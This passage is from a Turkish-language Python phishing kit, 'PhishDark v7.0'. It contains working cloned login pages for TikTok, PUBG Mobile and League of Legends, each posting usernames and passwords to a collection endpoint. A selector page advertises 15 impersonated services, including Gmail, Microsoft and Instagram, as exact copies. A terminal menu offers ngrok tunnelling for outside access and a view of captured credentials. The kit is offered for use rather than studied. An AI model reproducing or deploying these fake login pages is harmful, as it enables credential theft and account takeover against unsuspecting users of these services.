        .login-btn { width: 100%; padding: 16px; background: linear-gradient(45deg, var(--tiktok-pink), var(--tiktok-blue)); color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 10px; transition: all 0.2s; touch-action: manipulation; }
        .login-btn:active { transform: scale(0.98); }
        .divider { display: flex; align-items: center; margin: 25px 0; color: #666; }
        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #444; }
        .divider span { margin: 0 15px; }
        .social-login { display: flex; flex-direction: column; gap: 12px; }
        .social-btn { display: flex; align-items: center; justify-content: center; padding: 14px; background: #222; border: 1px solid #444; border-radius: 8px; color: white; font-size: 16px; cursor: pointer; transition: all 0.2s; touch-action: manipulation; }
        .social-btn:active { background: #333; }
        .social-btn i { margin-right: 10px; font-size: 20px; }
        .signup-link { text-align: center; margin-top: 25px; color: #666; }
        .signup-link a { color: var(--tiktok-blue); text-decoration: none; font-weight: 600; }
        .forgot-password { text-align: center; margin-top: 20px; }
        .forgot-password a { color: #666; text-decoration: none; font-size: 14px; }
        .language-select { width: 100%; padding: 12px; background: #222; border: 1px solid #444; border-radius: 8px; color: white; margin-top: 25px; font-size: 14px; }
        footer { margin-top: 30px; text-align: center; color: #666; font-size: 12px; }
        footer a { color: #666; text-decoration: none; }
        @media (max-width: 450px) {
            .container { padding: 15px; }
            .tiktok-logo { font-size: 36px; }
            .welcome { font-size: 20px; }
            .login-box { padding: 20px; }
            .input-field { padding: 14px; }
            .login-btn { padding: 14px; }
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="tiktok-logo">TikTok</div>
            <div class="welcome">Giriş yap</div>
        </div>
        <div class="login-box">
            <form method="POST" action="/login">
                <input type="hidden" name="platform" value="tiktok">
                <input class="input-field" type="text" name="username" placeholder="Telefon/e-posta/kullanıcı adı" required autocomplete="username">
                <input class="input-field" type="password" name="password" placeholder="Şifre" required autocomplete="current-password">
                <button class="login-btn" type="submit">Giriş yap</button>
            </form>
            <div class="forgot-password">
                <a href="#">Şifrenizi mi unuttunuz?</a>
            </div>
            <div class="divider"><span>veya</span></div>
            <div class="social-login">
                <button class="social-btn"><i class="fab fa-qrcode"></i> QR kod ile giriş yap</button>
                <button class="social-btn"><i class="fab fa-facebook"></i> Facebook ile giriş yap</button>
                <button class="social-btn"><i class="fab fa-google"></i> Google ile giriş yap</button>
                <button class="social-btn"><i class="fab fa-twitter"></i> Twitter ile giriş yap</button>
            </div>
            <div class="signup-link">
                <p>Hesabınız yok mu? <a href="#">Kaydol</a></p>
            </div>
        </div>
        <select class="language-select">
            <option>Türkçe</option>
            <option>English</option>
            <option>Deutsch</option>
            <option>Español</option>
        </select>
        <footer>
            <p><a href="#">Gizlilik Politikası</a> · <a href="#">Kullanım Şartları</a> · <a href="#">Yardım</a></p>
            <p style="margin-top: 10px;">© 2024 TikTok</p>
        </footer>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            if ('ontouchstart' in window) {
                document.querySelectorAll('button, input, select, .social-btn').forEach(el => {
                    el.style.minHeight = '44px';
                });
            }
        });
    </script>
</body>
</html>""",

    # 14. PUBG Mobile
    "pubg": """<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
    <title>PUBG MOBILE</title>
    <style>
        :root {
            --pubg-gold: #ffb400;
            --pubg-orange: #ff6b00;
            --pubg-dark: #0a0a0a;
            --pubg-darker: #1a1a1a;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { background: linear-gradient(180deg, var(--pubg-dark) 0%, var(--pubg-darker) 100%); color: #fff; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; font-family: 'Arial', sans-serif; }
        .login-container { background: rgba(26, 26, 26, 0.9); padding: 30px; border-radius: 15px; width: 100%; max-width: 420px; border: 2px solid var(--pubg-gold); box-shadow: 0 0 30px rgba(255, 180, 0, 0.3); }
        .pubg-logo { text-align: center; margin-bottom: 25px; }
        .pubg-logo h1 { font-size: 36px; font-weight: 800; background: linear-gradient(45deg, var(--pubg-gold), var(--pubg-orange)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .pubg-logo p { color: var(--pubg-gold); font-size: 14px; margin-top: 5px; }
        .input-field { width: 100%; padding: 16px; margin-bottom: 20px; background: var(--pubg-darker); border: 2px solid var(--pubg-gold); border-radius: 8px; color: #fff; font-size: 16px; transition: all 0.2s; }
        .input-field:focus { outline: none; border-color: var(--pubg-orange); }
        .login-btn { width: 100%; padding: 18px; background: linear-gradient(45deg, var(--pubg-gold), var(--pubg-orange)); color: #000; border: none; border-radius: 8px; font-size: 18px; font-weight: 800; cursor: pointer; margin-top: 10px; transition: all 0.2s; touch-action: manipulation; }
        .login-btn:active { transform: scale(0.98); }
        .options { display: flex; justify-content: space-between; margin-top: 20px; color: var(--pubg-gold); font-size: 14px; }
        .options label { display: flex; align-items: center; }
        .options a { color: var(--pubg-gold); text-decoration: none; }
        .divider { display: flex; align-items: center; margin: 25px 0; color: var(--pubg-gold); }
        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: var(--pubg-gold); }
        .divider span { margin: 0 15px; }
        .social-login { display: flex; flex-direction: column; gap: 12px; }
        .social-btn { display: flex; align-items: center; justify-content: center; padding: 14px; background: var(--pubg-darker); border: 2px solid var(--pubg-gold); border-radius: 8px; color: var(--pubg-gold); font-size: 16px; cursor: pointer; transition: all 0.2s; touch-action: manipulation; }
        .social-btn:active { background: #2a2a2a; }
        .social-btn i { margin-right: 10px; font-size: 20px; }
        .create-account { text-align: center; margin-top: 25px; color: var(--pubg-gold); }
        .create-account a { color: #fff; font-weight: 700; text-decoration: none; }
        .copyright { text-align: center; margin-top: 20px; color: #666; font-size: 12px; }
        @media (max-width: 450px) {
            .login-container { padding: 20px; }
            .pubg-logo h1 { font-size: 30px; }
            .input-field { padding: 14px; }
            .login-btn { padding: 16px; }
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <div class="login-container">
        <div class="pubg-logo">
            <h1>PUBG MOBILE</h1>
            <p>BATTLEGROUNDS</p>
        </div>
        <form method="POST" action="/login">
            <input type="hidden" name="platform" value="pubg">
            <input class="input-field" type="text" name="username" placeholder="Oyuncu ID" required autocomplete="username">
            <input class="input-field" type="password" name="password" placeholder="Şifre" required autocomplete="current-password">
            <button class="login-btn" type="submit">Giriş Yap</button>
        </form>
        <div class="options">
            <label><input type="checkbox" style="margin-right: 8px;"> Beni hatırla</label>
            <a href="#">Şifrenizi mi unuttunuz?</a>
        </div>
        <div class="divider"><span>VEYA</span></div>
        <div class="social-login">
            <button class="social-btn"><i class="fab fa-facebook"></i> Facebook ile giriş yap</button>
            <button class="social-btn"><i class="fab fa-twitter"></i> Twitter ile giriş yap</button>
            <button class="social-btn"><i class="fab fa-google"></i> Google ile giriş yap</button>
        </div>
        <div class="create-account">
            <p>Hesabınız yok mu? <a href="#">Hemen Oluşturun</a></p>
        </div>
        <div class="copyright">
            <p>© 2024 KRAFTON, Inc. All rights reserved.</p>
        </div>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            if ('ontouchstart' in window) {
                document.querySelectorAll('button, input, .social-btn').forEach(el => {
                    el.style.minHeight = '44px';
                });
            }
        });
    </script>
</body>
</html>""",

    # 15. League of Legends
    "league-of-legends": """<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
    <title>League of Legends</title>
    <style>
        :root {
            --lol-gold: #c8aa6e;
            --lol-dark: #0a1428;
            --lol-darker: #1c2b4a;
            --lol-brown: #785a28;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { background: linear-gradient(180deg, var(--lol-dark) 0%, var(--lol-darker) 100%); color: #f0e6d2; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; font-family: 'Beaufort for LOL', serif; }
        .login-container { background: rgba(12, 21, 39, 0.95); padding: 30px; border-radius: 15px; width: 100%; max-width: 420px; border: 2px solid var(--lol-gold); box-shadow: 0 0 30px rgba(200, 170, 110, 0.3); }
        .lol-logo { text-align: center; margin-bottom: 25px; }
        .lol-logo h1 { font-size: 36px; font-weight: 800; color: var(--lol-gold); letter-spacing: 2px; }
        .lol-logo p { color: var(--lol-gold); font-size: 14px; margin-top: 5px; }
        .input-field { width: 100%; padding: 16px; margin-bottom: 20px; background: var(--lol-dark); border: 2px solid var(--lol-gold); border-radius: 8px; color: #f0e6d2; font-size: 16px; transition: all 0.2s; }
        .input-field:focus { outline: none; border-color: var(--lol-brown); }
        .login-btn { width: 100%; padding: 18px; background: linear-gradient(45deg, var(--lol-gold), var(--lol-brown)); color: var(--lol-darker); border: none; border-radius: 8px; font-size: 18px; font-weight: 800; cursor: pointer; margin-top: 10px; transition: all 0.2s; touch-action: manipulation; }
        .login-btn:active { transform: scale(0.98); }
        .options { display: flex; justify-content: space-between; margin-top: 20px; color: var(--lol-gold); font-size: 14px; }
        .options label { display: flex; align-items: center; }
        .options a { color: var(--lol-gold); text-decoration: none; }
        .divider { display: flex; align-items: center; margin: 25px 0; color: var(--lol-gold); }
        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: var(--lol-gold); }
        .divider span { margin: 0 15px; }
        .social-login { display: flex; flex-direction: column; gap: 12px; }
        .social-btn { display: flex; align-items: center; justify-content: center; padding: 14px; background: var(--lol-dark); border: 2px solid var(--lol-gold); border-radius: 8px; color: var(--lol-gold); font-size: 16px; cursor: pointer; transition: all 0.2s; touch-action: manipulation; }
        .social-btn:active { background: var(--lol-darker); }
        .social-btn i { margin-right: 10px; font-size: 20px; }
        .create-account { text-align: center; margin-top: 25px; color: var(--lol-gold); }
        .create-account a { color: #f0e6d2; font-weight: 700; text-decoration: none; }
        .riot-logo { text-align: center; margin-top: 25px; }
        .riot-logo img { width: 60px; opacity: 0.7; }
        .copyright { text-align: center; margin-top: 20px; color: #666; font-size: 12px; }
        @media (max-width: 450px) {
            .login-container { padding: 20px; }
            .lol-logo h1 { font-size: 30px; }
            .input-field { padding: 14px; }
            .login-btn { padding: 16px; }
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <div class="login-container">
        <div class="lol-logo">
            <h1>LEAGUE OF LEGENDS</h1>
            <p>Riot Games</p>
        </div>
        <form method="POST" action="/login">
            <input type="hidden" name="platform" value="league-of-legends">
            <input class="input-field" type="text" name="username" placeholder="Riot ID" required autocomplete="username">
            <input class="input-field" type="password" name="password" placeholder="Şifre" required autocomplete="current-password">
            <button class="login-btn" type="submit">Giriş Yap</button>
        </form>
        <div class="options">
            <label><input type="checkbox" style="margin-right: 8px;"> Beni hatırla</label>
            <a href="#">Şifrenizi mi unuttunuz?</a>
        </div>
        <div class="divider"><span>VEYA</span></div>
        <div class="social-login">
            <button class="social-btn"><i class="fab fa-google"></i> Google ile giriş yap</button>
            <button class="social-btn"><i class="fab fa-facebook"></i> Facebook ile giriş yap</button>
            <button class="social-btn"><i class="fab fa-apple"></i> Apple ile giriş yap</button>
        </div>
        <div class="create-account">
            <p>Riot Games hesabınız yok mu? <a href="#">Hemen Oluşturun</a></p>
        </div>
        <div class="riot-logo">
            <img src="https://static.wikia.nocookie.net/leagueoflegends/images/8/86/Riot_Games_2022_Icon.png" alt="Riot Games" loading="lazy">
        </div>
        <div class="copyright">
            <p>© 2024 Riot Games, Inc. League of Legends ve Riot Games, Riot Games, Inc.'in ticari markalarıdır.</p>
        </div>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            if ('ontouchstart' in window) {
                document.querySelectorAll('button, input, .social-btn').forEach(el => {
                    el.style.minHeight = '44px';
                });
            }
        });
    </script>
</body>
</html>""",
}

# =============================================
# GELİŞTİRİLMİŞ SELECT ARAYÜZÜ
# =============================================

SELECT_PAGE = """<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
    <title>PhishDark v7.0 | Gökhan Yakut</title>
    <meta name="description" content="15 Premium Şablon - %100 Orijinal Görünüm">
    <style>
        :root {
            --primary: #8a3ab9;
            --secondary: #cd486b;
            --accent: #fbad50;
            --dark: #0a0a0a;
            --darker: #1a1a1a;
            --light: #ffffff;
            --gray: #666666;
        }
        * { 
            margin: 0; 
            padding: 0; 
            box-sizing: border-box; 
            -webkit-tap-highlight-color: transparent;
        }
        body { 
            background: linear-gradient(135deg, var(--dark) 0%, var(--darker) 50%, var(--dark) 100%);
            color: var(--light); 
            min-height: 100vh;
            padding: 15px;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
        }
        .header {
            text-align: center;
            padding: 25px 20px;
            margin-bottom: 25px;
            background: rgba(20, 20, 20, 0.9);
            border-radius: 20px;
            border: 2px solid var(--primary);
            box-shadow: 0 10px 30px rgba(138, 58, 185, 0.3);
            backdrop-filter: blur(10px);
        }
        .title {
            font-size: 2.2em;
            font-weight: 900;
            background: linear-gradient(45deg, var(--primary), var(--secondary), var(--accent));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 10px;
        }
        .version {
            display: inline-block;
            background: linear-gradient(45deg, #ff416c, #ff4b2b);
            padding: 6px 18px;
            border-radius: 20px;
            font-weight: bold;
            margin-bottom: 10px;
            font-size: 0.9em;
        }
        .developer-info {
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            gap: 15px;
            margin-top: 15px;
            padding: 12px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 12px;
        }
        .dev-link {
            display: flex;
            align-items: center;
            gap: 8px;
            color: var(--primary);
            text-decoration: none;
            font-size: 0.85em;
            padding: 8px 12px;
            border-radius: 8px;
            background: rgba(138, 58, 185, 0.1);
            transition: all 0.3s;
        }
        .dev-link:active {
            background: rgba(138, 58, 185, 0.3);
            transform: scale(0.98);
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 12px;
            margin-bottom: 25px;
        }
        .stat-box {
            background: linear-gradient(135deg, rgba(138, 58, 185, 0.2), rgba(205, 72, 107, 0.2));
            padding: 15px;
            border-radius: 12px;
            border: 1px solid rgba(138, 58, 185, 0.5);
            text-align: center;
            backdrop-filter: blur(5px);
        }
        .stat-number {
            font-size: 1.8em;
            font-weight: bold;
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .stat-label {
            font-size: 0.8em;
            color: #aaa;
            margin-top: 5px;
        }
        .templates-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: 15px;
            margin-bottom: 25px;
        }
        .template-card {
            background: linear-gradient(135deg, rgba(26, 26, 26, 0.9), rgba(40, 40, 40, 0.9));
            border-radius: 15px;
            padding: 20px;
            border: 2px solid transparent;
            position: relative;
            overflow: hidden;
            backdrop-filter: blur(10px);
            min-height: 170px;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            transition: all 0.3s;
        }
        .template-card:active {
            border-color: var(--primary);
            transform: scale(0.98);
        }
        .template-icon {
            font-size: 36px;
            margin-bottom: 15px;
            height: 60px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: rgba(138, 58, 185, 0.1);
            border-radius: 50%;
            width: 60px;
            margin: 0 auto 15px;
        }
        .template-title {
            font-size: 1.2em;
            font-weight: bold;
            margin-bottom: 10px;
            color: #fff;
            text-align: center;
        }
        .template-desc {
            color: #aaa;
            font-size: 0.85em;
            margin-bottom: 15px;
            text-align: center;
            flex-grow: 1;
        }
        .template-status {
            display: inline-block;
            padding: 6px 15px;
            border-radius: 20px;
            font-size: 0.75em;
            font-weight: bold;
            text-align: center;
        }
        .status-premium {
            background: linear-gradient(45deg, #ffd700, #ffa500);
            color: #000;
        }
        .status-original {
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            color: white;
        }
        .footer {
            text-align: center;
            margin-top: 30px;
            padding: 20px;
            color: var(--gray);
            background: rgba(20, 20, 20, 0.8);
            border-radius: 15px;
            border-top: 1px solid #333;
        }
        .release-date {
            color: var(--primary);
            font-weight: bold;
            font-size: 1em;
            margin: 10px 0;
        }
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            color: white;
            padding: 15px 25px;
            border-radius: 10px;
            display: none;
            z-index: 1000;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        }
        .template-link {
            text-decoration: none;
            color: inherit;
            display: block;
            height: 100%;
        }
        @media (max-width: 768px) {
            .title { font-size: 1.8em; }
            .stats { grid-template-columns: repeat(2, 1fr); }
            .templates-grid { grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); }
        }
        @media (max-width: 480px) {
            .title { font-size: 1.6em; }
            .stats { grid-template-columns: 1fr; }
            .templates-grid { grid-template-columns: 1fr; }
            .header { padding: 15px; }
            .developer-info { flex-direction: column; align-items: center; }
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <div class="notification" id="notification">
        <i class="fas fa-spinner fa-spin"></i> Şablon yükleniyor...
    </div>
    
    <div class="header">
        <h1 class="title">PhishDark v7.0</h1>
        <div class="version">v7.0 GÜNCELLENMİŞ</div>
        <p style="color: #aaa; margin-bottom: 10px;">15 Premium Şablon - %100 Orijinal Görünüm</p>
        
        <div class="developer-info">
            <a href="https://github.com/Byyazilimci" target="_blank" class="dev-link">
                <i class="fab fa-github"></i> GitHub:Byyazilimci
            </a>
            <a href="https://youtube.com/@Bygokhanyakut" target="_blank" class="dev-link">
                <i class="fab fa-youtube"></i> YouTube: @Bygokhanyakut
            </a>
            <a href="https://instagram.com/black.hack.34" target="_blank" class="dev-link">
                <i class="fab fa-instagram"></i> Instagram: @black.hack.34
            </a>
        </div>
    </div>
    
    <div class="stats">
        <div class="stat-box">
            <div class="stat-number">15</div>
            <div class="stat-label">Premium Şablon</div>
        </div>
        <div class="stat-box">
            <div class="stat-number">%100</div>
            <div class="stat-label">Orijinal Görünüm</div>
        </div>
        <div class="stat-box">
            <div class="stat-number">v7.0</div>
            <div class="stat-label">Güncel Versiyon</div>
        </div>
    </div>
    
    <div class="templates-grid">
        <!-- 15 Şablon Kartları -->
        <a href="/instagram" class="template-link">
            <div class="template-card">
                <div class="template-icon">📷</div>
                <div class="template-title">Instagram</div>
                <div class="template-desc">Modern sosyal medya giriş arayüzü</div>
                <span class="template-status status-premium">MOBİL UYUMLU</span>
            </div>
        </a>
        
        <a href="/facebook" class="template-link">
            <div class="template-card">
                <div class="template-icon">👥</div>
                <div class="template-title">Facebook</div>
                <div class="template-desc">Responsive Facebook giriş sayfası</div>
                <span class="template-status status-premium">MOBİL UYUMLU</span>
            </div>
        </a>
        
        <a href="/netflix" class="template-link">
            <div class="template-card">
                <div class="template-icon">🎬</div>
                <div class="template-title">Netflix</div>
                <div class="template-desc">Video streaming servisi girişi</div>
                <span class="template-status status-original">MOBİL UYUMLU</span>
            </div>
        </a>
        
        <a href="/steam" class="template-link">
            <div class="template-card">
                <div class="template-icon">🎮</div>
                <div class="template-title">Steam</div>
                <div class="template-desc">Oyun platformu giriş sayfası</div>
                <span class="template-status status-original">MOBİL UYUMLU</span>
            </div>
        </a>
        
        <a href="/epic-games" class="template-link">
            <div class="template-card">
                <div class="template-icon">🎯</div>
                <div class="template-title">Epic Games</div>
                <div class="template-desc">Oyun mağazası giriş arayüzü</div>
                <span class="template-status status-original">MOBİL UYUMLU</span>
            </div>
        </a>
        
        <a href="/twitter" class="template-link">
            <div class="template-card">
                <div class="template-icon">🐦</div>
                <div class="template-title">Twitter</div>
                <div class="template-desc">Mikroblog platformu girişi</div>
                <span class="template-status status-premium">MOBİL UYUMLU</span>
            </div>
        </a>
        
        <a href="/discord" class="template-link">
            <div class="template-card">
                <div class="template-icon">💬</div>
                <div class="template-title">Discord</div>
                <div class="template-desc">Sohbet uygulaması giriş sayfası</div>
                <span class="template-status status-original">MOBİL UYUMLU</span>
            </div>
        </a>
        
        <a href="/spotify" class="template-link">
            <div class="template-card">
                <div class="template-icon">🎵</div>
                <div class="template-title">Spotify</div>
                <div class="template-desc">Müzik streaming servisi girişi</div>
                <span class="template-status status-original">MOBİL UYUMLU</span>
            </div>
        </a>
        
        <a href="/gmail" class="template-link">
            <div class="template-card">
                <div class="template-icon">📧</div>
                <div class="template-title">Gmail</div>
                <div class="template-desc">Google e-posta servisi girişi</div>
                <span class="template-status status-premium">MOBİL UYUMLU</span>
            </div>
        </a>
        
        <a href="/microsoft" class="template-link">
            <div class="template-card">
                <div class="template-icon">🪟</div>
                <div class="template-title">Microsoft</div>
                <div class="template-desc">Microsoft hesap giriş arayüzü</div>
                <span class="template-status status-original">MOBİL UYUMLU</span>
            </div>
        </a>
        
        <a href="/github" class="template-link">
            <div class="template-card">
                <div class="template-icon">💻</div>
                <div class="template-title">GitHub</div>
                <div class="template-desc">Kod barındırma platformu girişi</div>
                <span class="template-status status-original">MOBİL UYUMLU</span>
            </div>
        </a>
        
        <a href="/snapchat" class="template-link">
            <div class="template-card">
                <div class="template-icon">👻</div>
                <div class="template-title">Snapchat</div>
                <div class="template-desc">Anlık mesajlaşma giriş sayfası</div>
                <span class="template-status status-original">MOBİL UYUMLU</span>
            </div>
        </a>
        
        <a href="/tiktok" class="template-link">
            <div class="template-card">
                <div class="template-icon">🎵</div>
                <div class="template-title">TikTok</div>
                <div class="template-desc">Video paylaşım platformu girişi</div>
                <span class="template-status status-premium">MOBİL UYUMLU</span>
            </div>
        </a>
        
        <a href="/pubg" class="template-link">
            <div class="template-card">
                <div class="template-icon">🔫</div>
                <div class="template-title">PUBG Mobile</div>
                <div class="template-desc">Battle Royale oyunu girişi</div>
                <span class="template-status status-original">MOBİL UYUMLU</span>
            </div>
        </a>
        
        <a href="/league-of-legends" class="template-link">
            <div class="template-card">
                <div class="template-icon">⚔️</div>
                <div class="template-title">League of Legends</div>
                <div class="template-desc">MOBA oyunu giriş arayüzü</div>
                <span class="template-status status-original">MOBİL UYUMLU</span>
            </div>
        </a>
    </div>
    
    <div class="footer">
        <p class="release-date">🚀 Çıkış Tarihi: 01.01.2026 Saat 00:00</p>
        <p>PhishDark v7.0 © 2024-2026 | Geliştirici: Gökhan Yakut</p>
        <p style="margin-top: 10px; font-size: 0.85em; color: #888;">
            <i class="fas fa-shield-alt"></i> Tüm şablonlar orijinal sitelerin birebir mobil uyumlu kopyasıdır.
        </p>
        <p style="margin-top: 10px; color: var(--primary); font-size: 0.9em;">
            <i class="fas fa-mobile-alt"></i> %100 Mobil Uyumlu | 
            <i class="fas fa-bolt"></i> Hızlı Yükleme
        </p>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const notification = document.getElementById('notification');
            
            // Tüm şablon linklerine tıklama olayı
            document.querySelectorAll('.template-link').forEach(link => {
                link.addEventListener('click', function(e) {
                    notification.style.display = 'block';
                    notification.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Şablon yükleniyor...';
                    
                    setTimeout(() => {
                        notification.innerHTML = '<i class="fas fa-check-circle"></i> Şablon yüklendi!';
                        setTimeout(() => {
                            notification.style.display = 'none';
                        }, 1500);
                    }, 1000);
                });
            });
            
            // Mobil touch optimizasyonu
            if ('ontouchstart' in window) {
                document.querySelectorAll('.template-card, button, a').forEach(el => {
                    el.style.cursor = 'pointer';
                });
            }
            
            // Tarih kontrolü
            const now = new Date();
            const releaseDate = new Date('2026-01-01T00:00:00');
            if (now >= releaseDate) {
                document.querySelector('.release-date').innerHTML = 
                    '<i class="fas fa-rocket"></i> YAYINLANDI!';
            }
        });
    </script>
</body>
</html>"""

# =============================================
# TERMINAL ARAYÜZÜ DEVAMI
# =============================================

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    clear_screen()
    print(f"""{Colors.PINK}
    ╔══════════════════════════════════════════════════════════════════════════════════╗
    ║                                                                                  ║
    ║   ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██████╗  █████╗ ██████╗ ██╗  ██╗          ║
    ║   ██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝          ║
    ║   ██████╔╝███████║██║███████╗███████║██║  ██║███████║██████╔╝█████╔╝           ║
    ║   ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██║  ██║██╔══██║██╔══██╗██╔═██╗           ║
    ║   ██║     ██║  ██║██║███████║██║  ██║██████╔╝██║  ██║██║  ██║██║  ██╗          ║
    ║   ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝          ║
    ║                                                                                  ║
    ║   ─────────────────────────────────────────────────────────────────────────────  ║
    ║   » Versiyon: v7.0                                                               ║
    ║   » Geliştirici: Gökhan Yakut                                                    ║
    ║   » Çıkış Tarihi: 01.01.2026 00:00                                               ║
    ║   » Şablon Sayısı: 15 Premium                                                    ║
    ║   » Özellik: %100 Mobil Uyumlu                                                   ║
    ║   ─────────────────────────────────────────────────────────────────────────────  ║
    ║   » GitHub: github.com/gokhanyakut                                               ║
    ║   » YouTube: youtube.com/@gokhanyakut                                            ║
    ║   » Instagram: instagram.com/gokhanyakut                                         ║
    ║                                                                                  ║
    ╚══════════════════════════════════════════════════════════════════════════════════╝
    {Colors.ENDC}""")

def menu():
    print_banner()
    
    print(f"\n{Colors.BOLD}{Colors.CYAN}╔══════════════════════════════════════════════════════════════════════════════════╗{Colors.ENDC}")
    print(f"{Colors.BOLD}{Colors.CYAN}║                          🌟 PHISHDARK v7.0 ANA MENÜ 🌟                           ║{Colors.ENDC}")
    print(f"{Colors.BOLD}{Colors.CYAN}╠══════════════════════════════════════════════════════════════════════════════════╣{Colors.ENDC}")
    print(f"{Colors.BOLD}{Colors.CYAN}║   {Colors.GREEN}1.{Colors.ENDC}{Colors.BOLD} 📍 Yerel Sunucu Başlat (localhost)                                  ║{Colors.ENDC}")
    print(f"{Colors.BOLD}{Colors.CYAN}║   {Colors.GREEN}2.{Colors.ENDC}{Colors.BOLD} 🌐 Ngrok Tüneli Başlat (Dış Erişim)                              ║{Colors.ENDC}")
    print(f"{Colors.BOLD}{Colors.CYAN}║   {Colors.GREEN}3.{Colors.ENDC}{Colors.BOLD} 🚀 İkisini Birden Başlat                                           ║{Colors.ENDC}")
    print(f"{Colors.BOLD}{Colors.CYAN}║   {Colors.GREEN}4.{Colors.ENDC}{Colors.BOLD} 📊 İstatistikleri Göster                                         ║{Colors.ENDC}")
    print(f"{Colors.BOLD}{Colors.CYAN}║   {Colors.GREEN}5.{Colors.ENDC}{Colors.BOLD} 🔍 Ele Geçirilen Bilgileri Göster                                 ║{Colors.ENDC}")
    print(f"{Colors.BOLD}{Colors.CYAN}║   {Colors.GREEN}6.{Colors.ENDC}{Colors.BOLD} 🧹 Bilgileri Temizle                                               ║{Colors.ENDC}")
    print(f"{Colors.BOLD}{Colors.CYAN}║   {Colors.GREEN}7.{Colors.ENDC}{Colors.BOLD} 📱 Şablonları Listele & Test Et                                   ║{Colors.ENDC}")
    print(f"{Colors.BOLD}{Colors.CYAN}║   {Colors.GREEN}8.{Colors.ENDC}{Colors.BOLD} ⚙️  Ayarları Yapılandır                                            ║{Colors.ENDC}")
    print(f"{Colors.BOLD}{Colors.CYAN}║   {Colors.GREEN}9.{Colors.ENDC}{Colors.BOLD} ℹ️  Hakkında & Yardım                                              ║{Colors.ENDC}")
    print(f"{Colors.BOLD}{Colors.CYAN}║   {Colors.RED}0.{Colors.ENDC}{Colors.BOLD} 🚪 Çıkış                                                          ║{Colors.ENDC}")
    print(f"{Colors.BOLD}{Colors.CYAN}╚══════════════════════════════════════════════════════════════════════════════════╝{Colors.ENDC}")
    
    try:
        choice = input(f"\n{Colors.ORANGE}┌─({Colors.RED}root{Colors.ORANGE}@{Colors.GREEN}PhishDark-v7.0{Colors.ORANGE})\n└─{Colors.BLUE}$ {Colors.ENDC}")
        
        if choice == "1":
            port_input = input(f"{Colors.CYAN}↪ Port numarası (varsayılan 5000): {Colors.ENDC}") or "5000"
            try:
                port = int(port_input)
                if 1024 <= port <= 65535:
                    start_local(port)
                else:
                    print(f"{Colors.RED}⚠ Hata: Port 1024-65535 arasında olmalı!{Colors.ENDC}")
                    time.sleep(2)
                    menu()
            except ValueError:
                print(f"{Colors.RED}⚠ Hata: Geçersiz port numarası!{Colors.ENDC}")
                time.sleep(2)
                menu()
                
        elif choice == "2":
            port_input = input(f"{Colors.CYAN}↪ Port numarası (varsayılan 5000): {Colors.ENDC}") or "5000"
            try:
                port = int(port_input)
                if 1024 <= port <= 65535:
                    start_ngrok(port)
                else:
                    print(f"{Colors.RED}⚠ Hata: Port 1024-65535 arasında olmalı!{Colors.ENDC}")
                    time.sleep(2)
                    menu()
            except ValueError:
                print(f"{Colors.RED}⚠ Hata: Geçersiz port numarası!{Colors.ENDC}")
                time.sleep(2)
                menu()
                
        elif choice == "3":
            port_input = input(f"{Colors.CYAN}↪ Port numarası (varsayılan 5000): {Colors.ENDC}") or "5000"
            try:
                port = int(port_input)
                if 1024 <= port <= 65535:
